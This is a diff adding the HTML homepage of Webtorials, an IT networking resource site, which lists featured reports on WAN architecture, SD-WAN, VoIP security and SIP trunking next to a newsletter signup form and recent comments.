@@ -1,0 +1,1267 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" id="sixapart-standard">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="Content-Style-Type" content="text/css" />
+    <meta http-equiv="Content-Script-Type" content="text/javascript" />
+    <meta http-equiv="imagetoolbar" content="no" />    
+    <title>Webtorials</title>
+    <meta name="generator" content="Movable Type Pro 4.32-en" />
+    
+
+    
+        
+        
+
+        
+        
+        
+        <link rel="stylesheet" href="https://www.webtorials.com/content/styles.css" type="text/css" />
+        <link rel="alternate" type="application/atom+xml" title="Atom" href="https://www.webtorials.com/content/atom.xml" />
+        <link rel="start" href="https://www.webtorials.com/content/" title="Home" />
+        <script type="text/javascript" src="https://www.webtorials.com/content/mt.js"></script>
+        
+    
+
+
+    <link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.webtorials.com/content/rsd.xml" />
+
+    
+    <script type="text/javascript">
+    /* <![CDATA[ */
+    mtAttachEvent('load', mtUpdateScores);
+    mtAttachEvent('usersignin', mtUpdateScores);
+    /* ]]> */
+    </script>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-65248442-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+</head>
+<body id="mt-community-blog" class="mt-main-index layout-wm">
+    <div id="container">
+        <div id="container-inner">
+            <div id="header">
+                <div id="header-inner">
+                    <div id="header-content">
+
+                        <h1 id="header-name"><a href="https://www.webtorials.com/content/" accesskey="1"></a></h1>
+    
+
+
+<table >
+<tbody>
+<tr>
+<td style="width: 500px;" align="left" valign="bottom"><a href="https://www.webtorials.com/content/">
+<img src="https://www.webtorials.com/webtorials_logo_60pt.jpg" height="75"  /></a> </td>
+
+
+
+
+<td style="width: 575px;" align="right" valign="center">
+
+ 
+<! tag line in the header goes here>
+<font size="3" color="000099"><b><i>Data < </b></i></font>
+<font size="4" color="000099"><b><i>Information < </b></i></font>
+<font size="5" color="000099"><b><i>Knowledge < </b></i></font>
+<font size="6" color="000099"><b><i>Wisdom</b></i></font></td>
+
+</tr>
+</tbody>
+</table>  
+                 
+<hr><br />
+
+                        <! commented out $mt:Include module="Sign In"$>
+                       
+                   </div>
+                </div>
+            </div>
+            <div id="content">
+                <div id="content-inner">
+                    <div id="alpha">
+                        <div id="alpha-inner">
+
+
+
+<h1 style="font-size:24px">Featured Content</h1>
+
+
+    <div id="entry-4269" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2019/02/2019-digital-transformation-market-trends-report.html" rel="bookmark"><b>2019 Digital Transformation Market Trends Report</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="February 21, 2019"></abbr>
+
+
+
+<p style="color:black">
+<img src="https://www.webtorials.com/content/SAT_3.jpg"  class="mt-image-left" style="float: left; margin: 10px 20px 20px 0;" /><b>Steven Taylor - Editor-in-Chief, Webtorials</b><br />While Digital Transformation has become one of the hottest topics in the IT industry, it is also somewhat nebulous and thus runs the risk of being marketed as all things to all people. The purpose of this study is to find out what the story is behind the hype.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4267" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2018/02/is-voip-secure-you-make-the-call.html" rel="bookmark"><b>Is VoIP Secure? YOU Make the Call</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="February 20, 2018"></abbr>
+
+
+
+<p style="color:black">
+<img src="https://www.webtorials.com/content/SAT_3.jpg"  class="mt-image-left" style="float: left; margin: 10px 20px 20px 0;" /><b>Steven Taylor - Editor-in-Chief, Webtorials</b><br />Voice over IP (VoIP) is no longer tomorrow's technology. High-speed networks that support quality-of-service (QoS) technology have come a long way in mitigating performance and availability issues. But what about security?
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4263" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2018/02/the-2018-guide-to-wan-architecture-and-design---complete-edition.html" rel="bookmark"><b>The 2018 Guide to WAN Architecture and Design - Complete Edition</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="February 15, 2018"></abbr>
+
+
+
+<p style="color:black">
+<img alt="2018WAN.JPG" src="https://www.webtorials.com/content/2018WAN.JPG" width="120" height="41" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />The goals of the 2018 Guide to WAN Architecture and Design (The Guide) are to discuss the state of WAN architecture and design with an emphasis on the current SD-WAN solutions, and to provide insight into the emergence of solutions that leverage the key concepts of SDN and NFV to support all components of the WAN edge. 
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4262" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2018/02/the-2018-guide-to-wan-architecture-and-design---executive-summary.html" rel="bookmark"><b>The 2018 Guide to WAN Architecture and Design - Executive Summary</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="February 15, 2018"></abbr>
+
+
+
+<p style="color:black">
+<img alt="2018WAN.JPG" src="https://www.webtorials.com/content/2018WAN.JPG" width="120" height="41" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />The goals of the 2018 Guide to WAN Architecture and Design (The Guide) are to discuss the state of WAN architecture and design with an emphasis on the current SD-WAN solutions, and to provide insight into the emergence of solutions that leverage the key concepts of SDN and NFV to support all components of the WAN edge. 
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4259" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2018/01/the-2018-guide-to-wan-architecture-and-design---part-3-the-sd-wan-and-the-sd-branch-office-ecosystem.html" rel="bookmark"><b>The 2018 Guide to WAN Architecture and Design - Part 3: The SD-WAN and the SD-Branch Office Ecosystem</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="January 15, 2018"></abbr>
+
+
+
+<p style="color:black">
+<img alt="2018WAN.JPG" src="https://www.webtorials.com/content/2018WAN.JPG" width="120" height="41" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />The goals of the 2018 Guide to WAN Architecture and Design (The Guide) are to discuss the state of WAN architecture and design with an emphasis on the current SD-WAN solutions, and to provide insight into the emergence of solutions that leverage the key concepts of SDN and NFV to support all components of the WAN edge. 
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4255" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/12/the-2018-guide-to-wan-architecture-and-design---part-2-key-considerations-when-choosing-new-wan-and.html" rel="bookmark"><b>The 2018 Guide to WAN Architecture and Design - Part 2: Key Considerations when Choosing new WAN and Branch Office Solutions</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="December 13, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img alt="2018WAN.JPG" src="https://www.webtorials.com/content/2018WAN.JPG" width="120" height="41" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />The goals of the 2018 Guide to WAN Architecture and Design (The Guide) are to discuss the state of WAN architecture and design with an emphasis on the current SD-WAN solutions, and to provide insight into the emergence of solutions that leverage the key concepts of SDN and NFV to support all components of the WAN edge. 
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4253" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/11/the-sip-survey-2017.html" rel="bookmark"><b>The SIP Survey 2017</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="November 21, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img alt="SIP_School.jpg" src="https://www.webtorials.com/content/SIP_School.jpg" width="64" height="64" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" /><b>Graham Francis - CEO, The SIP School</b><br />The survey's purpose started off (years ago) with a focus on SIP trunking and specifically, to document the most common issues that occur during SIP trunk implementations and what can be done to help mitigate these issues, if at all. Inputs are collected from vendors, service providers, integrators, resellers and also from small to enterprise clients from all around the world.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4250" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/11/the-2018-guide-to-wan-architecture-and-design---part-1-state-of-the-wan.html" rel="bookmark"><b>The 2018 Guide to WAN Architecture and Design - Part 1: State of the WAN</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="November 14, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img alt="2018WAN.JPG" src="https://www.webtorials.com/content/2018WAN.JPG" width="120" height="41" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />The goals of the 2018 Guide to WAN Architecture and Design (The Guide) are to discuss the state of WAN architecture and design with an emphasis on the current SD-WAN solutions, and to provide insight into the emergence of solutions that leverage the key concepts of SDN and NFV to support all components of the WAN edge. 
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4247" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/06/are-you-wasting-mpls-capacity-by-back-hauling-internet-traffic.html" rel="bookmark"><b>Are you wasting MPLS capacity by back-hauling Internet traffic? </b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="June 19, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img alt="Cato3.JPG" src="https://www.webtorials.com/content/Cato3.JPG" width="104" height="59" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" /> Perhaps it's time to re-evaluate your MPLS Service Provider.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4237" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/05/the-2017-state-of-the-wan-report.html" rel="bookmark"><b>The 2017 State-of-the-WAN Report</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="May  2, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img alt="VisionaryVoices.JPG" src="https://www.webtorials.com/content/VisionaryVoices.JPG" width="119" height="39" class="mt-image-left" style="float: left; margin: 0 20px 20px 0;" />This e-book provides insight into the currrent state of the WAN based on the survey results received from over 100 network professionals in March and April, 2017.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4230" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/03/2017-productivity-report.html" rel="bookmark"><b>2017 Workplace Productivity and Communications Technology Report</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="March 23, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img src="https://www.webtorials.com/content/Mitel_3.jpg" class="mt-image-left" style="float: left; margin: 10px 20px 20px 0;" /> This study looks at how respondents communicate, how much time they use each communication mode including face-to-face meetings, email, telephone calls and conferences, video conferencing, Chat/Text/Instant Messages and online tools.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+    <div id="entry-4226" class="entry-asset asset hentry">
+    <div class="asset-header">
+        <span style="font-size: large;"><a href="https://www.webtorials.com/content/2017/02/the-2017-guide-to-wan-architecture-and-design---complete-edition.html" rel="bookmark"><b>The 2017 Guide to WAN Architecture and Design - Complete Edition</b></a>
+
+</span>
+
+<span style="font-size: medium;">
+
+
+
+
+<div class="asset-meta">
+   
+    <span class="byline">
+
+
+
+
+<abbr class="published" title="February 24, 2017"></abbr>
+
+
+
+<p style="color:black">
+<img src="https://www.webtorials.com/content/2017WAN5_3.jpg"  class="mt-image-left" style="float: left; margin: 10px 20px 20px 0;" /> Dr. Jim Metzler's annual Guide to WAN Architecture and Design - what you need to know about the most current statistics, trends and analysis regarding the State of the WAN.
+</p>
+
+
+
+</mt:If>
+    </span>
+
+</div>
+
+    
+
+
+
+
+</div>
+    <div class="asset-content entry-content">
+
+        <div class="asset-body">
+ 
+        </div>
+
+
+
+</br>
+</span>
+
+
+    </div>
+    <div class="asset-footer"></div>
+</div>
+
+<br />
+
+
+
+<p style="text-align: center;"><a href="https://www.webtorials.com/content/archives.html"><b>Access the Full Resource Archives
+</b></a></p>
+
+</div>
+                    </div>
+
+                    <div id="beta">
+    <div id="beta-inner">
+        
+
+        <div class="widget-content">
+
+</div>
+    
+
+
+
+   <h2 class="widget-header">Search Webtorials</h2>
+
+
+<div class="widget-search1 widget">
+    
+    <div class="widget-content">
+
+
+        <form method="get" action="https://www.webtorials.com/mt/mt-search.cgi">
+            <input type="text" id="search" class="ti" name="search" value="" placeholder="Search Webtorials"/>
+
+            <input type="hidden" name="IncludeBlogs" value="7" />
+            <input type="hidden" name="limit" value="20" />
+
+         
+<input type="submit" accesskey="4" value=" Search " />
+        </form>
+    </div>
+</div>
+
+
+
+
+<h2 class="widget-header">Get E-News and Notices via Email</h2>
+
+
+<div class="widget-content">
+<form method="post" action="https://webtorials.com/mail/signup.php">
+
+<input name="list" value="3" type="hidden" />
+
+<div style="text-align: center;">
+
+<br />
+<input type="text" name="fname" placeholder="First Name" />&nbsp;&nbsp;
+<input type="text" name="lname" placeholder="Last Name" /><br /><br />
+
+<input type="text" name="email" placeholder="Email Address" />
+&nbsp;
+<input type="text" name="user1" placeholder="Company" />
+
+<br /><br />
+
+<select name="user4">
+
+<option value="US">UNITED STATES</font></option>
+<option value="CA">CANADA</option>
+<option value="UM">UNITED STATES MINOR OUTLYING ISLANDS</option>
+<option value="AF">AFGHANISTAN </option>
+<option value="AX">ALAND ISLANDS</option>
+<option value="AL">ALBANIA</option>
+<option value="DZ">ALGERIA</option>
+<option value="AS">AMERICAN SAMOA</option>
+<option value="AD">ANDORRA</option>
+<option value="AO">ANGOLA</option>
+<option value="AI">ANGUILLA</option>
+<option value="AQ">ANTARCTICA</option>
+<option value="AG">ANTIGUA AND BARBUDA</option>
+<option value="AR">ARGENTINA</option>
+<option value="AM">ARMENIA</option>
+<option value="AW">ARUBA</option>
+<option value="AU">AUSTRALIA</option>
+<option value="AT">AUSTRIA</option>
+<option value="AZ">AZERBAIJAN</option>
+<option value="BS">BAHAMAS</option>
+<option value="BH">BAHRAIN</option>
+<option value="BD">BANGLADESH</option>
+<option value="BB">BARBADOS</option>
+<option value="BY">BELARUS</option>
+<option value="BE">BELGIUM</option>
+<option value="BZ">BELIZE</option>
+<option value="BJ">BENIN</option>
+<option value="BM">BERMUDA</option>
+<option value="BT">BHUTAN</option>
+<option value="BO">BOLIVIA</option>
+<option value="BA">BOSNIA AND HERZEGOVINA</option>
+<option value="BW">BOTSWANA</option>
+<option value="BV">BOUVET ISLAND</option>
+<option value="BR">BRAZIL</option>
+<option value="IO">BRITISH INDIAN OCEAN TERRITORY</option>
+<option value="BN">BRUNEI DARUSSALAM</option>
+<option value="BG">BULGARIA</option>
+<option value="BF">BURKINA FASO</option>
+<option value="BI">BURUNDI</option>
+<option value="KH">CAMBODIA</option>
+<option value="CM">CAMEROON</option>
+<option value="CV">CAPE VERDE</option>
+<option value="KY">CAYMAN ISLANDS</option>
+<option value="CF">CENTRAL AFRICAN REPUBLIC</option>
+<option value="TD">CHAD</option>
+<option value="CL">CHILE</option>
+<option value="CN">CHINA</option>
+<option value="CX">CHRISTMAS ISLAND</option>
+<option value="CC">COCOS (KEELING) ISLANDS</option>
+<option value="CO">COLOMBIA</option>
+<option value="KM">COMOROS</option>
+<option value="CG">CONGO</option>
+<option value="CD">CONGO, THE DEMOCRATIC REPUBLIC OF THE (ZAIRE)</option>
+<option value="CK">COOK ISLANDS</option>
+<option value="CR">COSTA RICA</option>
+<option value="CI">COTE D'IVOIRE</option>
+<option value="HR">CROATIA</option>
+<option value="CU">CUBA</option>
+<option value="CY">CYPRUS</option>
+<option value="CZ">CZECH REPUBLIC</option>
+<option value="DK">DENMARK</option>
+<option value="DJ">DJIBOUTI</option>
+<option value="DM">DOMINICA</option>
+<option value="DO">DOMINICAN REPUBLIC</option>
+<option value="EC">ECUADOR</option>
+<option value="EG">EGYPT</option>
+<option value="SV">EL SALVADOR</option>
+<option value="GQ">EQUATORIAL GUINEA</option>
+<option value="ER">ERITREA</option>
+<option value="EE">ESTONIA</option>
+<option value="ET">ETHIOPIA</option>
+<option value="FK">FALKLAND ISLANDS (MALVINAS)</option>
+<option value="FO">FAROE ISLANDS</option>
+<option value="FJ">FIJI</option>
+<option value="FI">FINLAND</option>
+<option value="FR">FRANCE</option>
+<option value="GF">FRENCH GUIANA</option>
+<option value="PF">FRENCH POLYNESIA</option>
+<option value="TF">FRENCH SOUTHERN TERRITORIES</option>
+<option value="GA">GABON </option>
+<option value="GM">GAMBIA</option>
+<option value="GE">GEORGIA</option>
+<option value="DE">GERMANY</option>
+<option value="GH">GHANA</option>
+<option value="GI">GIBRALTAR</option>
+<option value="GR">GREECE</option>
+<option value="GL">GREENLAND</option>
+<option value="GD">GRENADA</option>
+<option value="GP">GUADELOUPE</option>
+<option value="GU">GUAM </option>
+<option value="GT">GUATEMALA</option>
+<option value="GG">GUERNSEY</option>
+<option value="GN">GUINEA</option>
+<option value="GW">GUINEA-BISSAU</option>
+<option value="GY">GUYANA</option>
+<option value="HT">HAITI</option>
+<option value="HM">HEARD ISLAND AND MCDONALD ISLANDS</option>
+<option value="HN">HONDURAS</option>
+<option value="HK">HONG KONG</option>
+<option value="HU">HUNGARY</option>
+<option value="IS">ICELAND</option>
+<option value="IN">INDIA</option>
+<option value="ID">INDONESIA</option>
+<option value="IR">IRAN, ISLAMIC REPUBLIC OF</option>
+<option value="IQ">IRAQ</option>
+<option value="IE">IRELAND</option>
+<option value="IM">ISLE OF MAN</option>
+<option value="IL">ISRAEL</option>
+<option value="IT">ITALY</option>
+<option value="JM">JAMAICA</option>
+<option value="JP">JAPAN</option>
+<option value="JE">JERSEY</option>
+<option value="JO">JORDAN</option>
+<option value="KZ">KAZAKHSTAN</option>
+<option value="KE">KENYA</option>
+<option value="KI">KIRIBATI</option>
+<option value="KP">KOREA, DEMOCRATIC PEOPLE'S REPUBLIC OF</option>
+<option value="KR">KOREA, REPUBLIC OF</option>
+<option value="KW">KUWAIT</option>
+<option value="KG">KYRGYZSTAN</option>
+<option value="LA">LAO PEOPLE'S DEMOCRATIC REPUBLIC </option>
+<option value="LV">LATVIA</option>
+<option value="LB">LEBANON</option>
+<option value="LS">LESOTHO</option>
+<option value="LR">LIBERIA</option>
+<option value="LY">LIBYAN ARAB JAMAHIRIYA</option>
+<option value="LI">LIECHTENSTEIN</option>
+<option value="LT">LITHUANIA</option>
+<option value="LU">LUXEMBOURG</option>
+<option value="MO">MACAO</option>
+<option value="MK">MACEDONIA, THE FORMER YUGOSLAV REPUBLIC OF</option>
+<option value="MG">MADAGASCAR</option>
+<option value="MW">MALAWI</option>
+<option value="MY">MALAYSIA</option>
+<option value="MV">MALDIVES</option>
+<option value="ML">MALI</option>
+<option value="MT">MALTA</option>
+<option value="MH">MARSHALL ISLANDS</option>
+<option value="MQ">MARTINIQUE</option>
+<option value="MR">MAURITANIA</option>
+<option value="MU">MAURITIUS</option>
+<option value="YT">MAYOTTE</option>
+<option value="MX">MEXICO</option>
+<option value="FM">MICRONESIA, FEDERATED STATES OF</option>
+<option value="MD">MOLDOVA, REPUBLIC OF</option>
+<option value="MC">MONACO</option>
+<option value="MN">MONGOLIA</option>
+<option value="ME">MONTENEGRO</option>
+<option value="MS">MONTSERRAT</option>
+<option value="MA">MOROCCO</option>
+<option value="MZ">MOZAMBIQUE</option>
+<option value="MM">MYANMAR</option>
+<option value="NA">NAMIBIA</option>
+<option value="NR">NAURU</option>
+<option value="NP">NEPAL</option>
+<option value="NL">NETHERLANDS</option>
+<option value="AN">NETHERLANDS ANTILLES</option>
+<option value="NC">NEW CALEDONIA</option>
+<option value="NZ">NEW ZEALAND</option>
+<option value="NI">NICARAGUA</option>
+<option value="NE">NIGER</option>
+<option value="NG">NIGERIA</option>
+<option value="NU">NIUE</option>
+<option value="NF">NORFOLK ISLAND</option>
+<option value="MP">NORTHERN MARIANA ISLANDS</option>
+<option value="NO">NORWAY</option>
+<option value="OM">OMAN</option>
+<option value="PK">PAKISTAN</option>
+<option value="PW">PALAU</option>
+<option value="PS">PALESTINIAN TERRITORY, OCCUPIED</option>
+<option value="PA">PANAMA</option>
+<option value="PG">PAPUA NEW GUINEA</option>
+<option value="PY">PARAGUAY</option>
+<option value="PE">PERU</option>
+<option value="PH">PHILIPPINES</option>
+<option value="PN">PITCAIRN</option>
+<option value="PL">POLAND</option>
+<option value="PT">PORTUGAL</option>
+<option value="PR">PUERTO RICO</option>
+<option value="QA">QATAR</option>
+<option value="RE">RÃ‰UNION</option>
+<option value="RO">ROMANIA</option>
+<option value="RU">RUSSIAN FEDERATION</option>
+<option value="RW">RWANDA</option>
+<option value="SH">SAINT HELENA </option>
+<option value="KN">SAINT KITTS AND NEVIS</option>
+<option value="LC">SAINT LUCIA</option>
+<option value="PM">SAINT PIERRE AND MIQUELON</option>
+<option value="VC">SAINT VINCENT AND THE GRENADINES</option>
+<option value="WS">SAMOA</option>
+<option value="SM">SAN MARINO</option>
+<option value="ST">SAO TOME AND PRINCIPE</option>
+<option value="SA">SAUDI ARABIA</option>
+<option value="SN">SENEGAL</option>
+<option value="RS">SERBIA</option>
+<option value="SC">SEYCHELLES</option>
+<option value="SL">SIERRA LEONE</option>
+<option value="SG">SINGAPORE</option>
+<option value="SK">SLOVAKIA</option>
+<option value="SI">SLOVENIA</option>
+<option value="SB">SOLOMON ISLANDS</option>
+<option value="SO">SOMALIA</option>
+<option value="ZA">SOUTH AFRICA</option>
+<option value="GS">SOUTH GEORGIA AND THE SOUTH SANDWICH ISLANDS</option>
+<option value="ES">SPAIN</option>
+<option value="LK">SRI LANKA</option>
+<option value="SD">SUDAN</option>
+<option value="SR">SURINAME</option>
+<option value="SJ">SVALBARD AND JAN MAYEN</option>
+<option value="SZ">SWAZILAND</option>
+<option value="SE">SWEDEN</option>
+<option value="CH">SWITZERLAND</option>
+<option value="SY">SYRIAN ARAB REPUBLIC</option>
+<option value="TW">TAIWAN</option>
+<option value="TJ">TAJIKISTAN</option>
+<option value="TZ">TANZANIA, UNITED REPUBLIC OF</option>
+<option value="TH">THAILAND</option>
+<option value="TL">TIMOR-LESTE</option>
+<option value="TG">TOGO</option>
+<option value="TK">TOKELAU</option>
+<option value="TO">TONGA</option>
+<option value="TT">TRINIDAD AND TOBAGO</option>
+<option value="TN">TUNISIA</option>
+<option value="TR">TURKEY</option>
+<option value="TM">TURKMENISTAN</option>
+<option value="TC">TURKS AND CAICOS ISLANDS</option>
+<option value="TV">TUVALU</option>
+<option value="UG">UGANDA</option>
+<option value="UA">UKRAINE</option>
+<option value="AE">UNITED ARAB EMIRATES</option>
+<option value="GB">UNITED KINGDOM</option>
+<option value="UY">URUGUAY</option>
+<option value="UZ">UZBEKISTAN</option>
+<option value="VU">VANUATU</option>
+<option value="VA">VATICAN CITY STATE (HOLY SEE )</option>
+<option value="VE">VENEZUELA</option>
+<option value="VN">VIET NAM</option>
+<option value="VG">VIRGIN ISLANDS, BRITISH</option>
+<option value="VI">VIRGIN ISLANDS, U.S.</option>
+<option value="WF">WALLIS AND FUTUNA</option>
+<option value="EH">WESTERN SAHARA</option>
+<option value="YE">YEMEN</option>
+<option value="ZM">ZAMBIA</option>
+<option value="ZW">ZIMBABWE</option>
+</select>
+
+<br /><br />
+<input type="text" name="user3" placeholder="ZIP or Postal Code" />
+&nbsp;&nbsp;
+
+
+
+<input type="hidden" name="user2" value="visitor" />
+<input type="hidden" name="user6" value="visitor" />
+<input type="hidden" name="user8" value="visitor" />
+
+
+
+<input type="hidden" name="user7" value="visitor" />
+<input type="hidden" name="user5" value="visitor" />
+<input type="hidden" name="user9" value="visitor" />
+<input type="hidden" name="user10" value="visitor" />
+
+
+<input type="submit" name="sup" value="Sign me up!" />
+<p style="font-size:10px">I accept <a href="https://www.webtorials.com/content/copyright-privacy-and-terms-of-use.html" target="_blank">Webtorials' Terms and Conditions</a>.</p>
+</form>
+</div></div>
+
+
+<div class="widget-recent-comments widget">
+
+
+    <h3 class="widget-header">Trending Discussions</h3>
+
+
+
+
+    <div class="widget-content">
+        <ul class="recent-comments-list">
+        
+            <li>If you would like to see the other articles in the blog post of the "Top Ten VoIP Articles of All Ti... <a href="https://www.webtorials.com/content/2018/02/is-voip-secure-you-make-the-call.html#comment-6926">Steven Taylor, Webtorials on "Is VoIP Secure? YOU Make the Call"</a>: </li>
+        
+    
+        
+            <li>Great job I followed since the begining thanks... <a href="https://www.webtorials.com/content/2018/02/the-2018-guide-to-wan-architecture-and-design---executive-summary.html#comment-6925">Eduardo PÃ©rez  Telesystems SpA on "The 2018 Guide to WAN Architecture and Design - Executive Summary"</a>: </li>
+        
+    
+        
+            <li>Thanks to Marjorie at RingCentral for reminding me that this paper existed.  Looking forward to your... <a href="https://www.webtorials.com/content/2018/02/is-voip-secure-you-make-the-call.html#comment-6924">Steven Taylor, Webtorials on "Is VoIP Secure? YOU Make the Call"</a>: </li>
+        
+    
+        
+            <li>looking at WAN re-engineering projects... <a href="https://www.webtorials.com/content/2017/12/the-2018-guide-to-wan-architecture-and-design---part-2-key-considerations-when-choosing-new-wan-and.html#comment-6920">Sunny on "The 2018 Guide to WAN Architecture and Design - Part 2: Key Considerations when Choosing new WAN and Branch Office Solutions"</a>: </li>
+        
+    
+        
+            <li>Hi Richard. We appreciate your feedback. Jim Metzler always provides excellent analysis on the ever-... <a href="https://www.webtorials.com/content/2017/05/the-2017-state-of-the-wan-report.html#comment-6878">Nancy Leonard, Webtorials on "The 2017 State-of-the-WAN Report"</a>: </li>
+        
+    
+        
